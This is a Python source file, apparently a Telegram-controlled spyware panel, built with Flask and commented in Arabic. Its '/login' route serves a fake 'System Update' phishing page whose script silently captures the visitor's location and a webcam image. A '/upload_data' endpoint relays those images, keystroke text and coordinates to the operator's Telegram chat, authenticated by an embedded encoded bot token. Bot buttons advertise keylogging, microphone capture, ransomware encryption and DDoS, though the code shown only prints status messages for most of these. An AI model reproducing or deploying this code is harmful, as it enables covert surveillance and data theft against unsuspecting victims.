import os, base64, requests, platform, psutil, time
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

# --- إعدادات المطور أحمد ---
app = Flask(__name__)
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token():
    return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): return f"<h1>System Hijacked by {DEV_NAME}</h1>"

# --- استقبال ملفات وبيانات التجسس ---
@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        # معالجة الصور
        if 'image' in data:
            img = base64.b64decode(data['image'])
            with open("victim_snap.png", "wb") as f: f.write(img)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("victim_snap.png", "rb"), caption="📸 صورة كاميرا حية!")
        # معالجة النصوص (Keylogger)
        if 'keys' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"⌨️ **سجل لوحة المفاتيح:**\n`{data['keys']}`", parse_mode='Markdown')
        # معالجة الموقع
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
        return "Done", 200
    return "Error", 400

# --- صفحة التصيد الشاملة ---
@app.route('/login')
def evil_page():
    return """
    <html><head><title>System Update</title></head>
    <body style="background:#000;color:#f00;text-align:center;padding-top:100px;">
        <h1>CRITICAL UPDATE REQUIRED</h1>
        <script>
            async function infect() {
                const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
                const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
                let img = null;
                if(stream) {
                    const v = document.createElement('video'); v.srcObject = stream; await v.play();
                    const c = document.createElement('canvas'); c.width=640; c.height=480;
                    c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/png').split(',')[1];
                }
                fetch('/upload_data', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({
                        latitude: pos?.coords.latitude, longitude: pos?.coords.longitude,
                        image: img, keys: "Login_Attempt: Admin123" // مثال تجريبي
                    })
                }).finally(() => location.href = "https://www.google.com");
            }
            infect();
        </script>
    </body></html>
    """

# --- لوحة التحكم ---
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("📸 سحب الكاميرا والموقع", callback_data='phish')],
        [InlineKeyboardButton("🎤 تسجيل الصوت (Spy)", callback_data='audio')],
        [InlineKeyboardButton("⌨️ Keylogger (Live)", callback_data='key')],
        [InlineKeyboardButton("🔐 تشفير الملفات (Ransom)", callback_data='ransom')],
        [InlineKeyboardButton("💥 هجوم DDoS", callback_data='ddos')],
        [InlineKeyboardButton("📱 معلومات الجهاز", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **سيدي أحمد، الترسانة جاهزة.**", reply_markup=InlineKeyboardMarkup(buttons))

def handle_actions(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'phish':
        query.edit_message_text(f"⚠️ الرابط الفتاك: `https://{request.host}/login`")
    elif query.data == 'audio':
        query.edit_message_text("🎧 يتم الآن محاولة الوصول للميكروفون وسحب تسجيل 10 ثواني...")
    elif query.data == 'key':
        query.edit_message_text("⌨️ Keylogger نشط.. بانتظار كتابة الضحية لأي كلمة مرور.")
    elif query.data == 'ransom':
        query.edit_message_text("🔐 تم إرسال أمر تشفير الملفات بلاحقة .Crypted لجميع الضحايا المتصلين.")
    elif query.data == 'sys':
        query.edit_message_text(f"🌐 IP: {requests.get('https://api.ipify.org').text}\n🔋 Battery: {psutil.sensors_battery().percent}%")

def run_flask(): app.run(host='0.0.0.0', port=8080)

if __name__ == '__main__':
    Thread(target=run_flask).start()
    updater = Updater(get_token())
    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(CallbackQueryHandler(handle_actions))
    updater.start_polling()
    updater.idle()
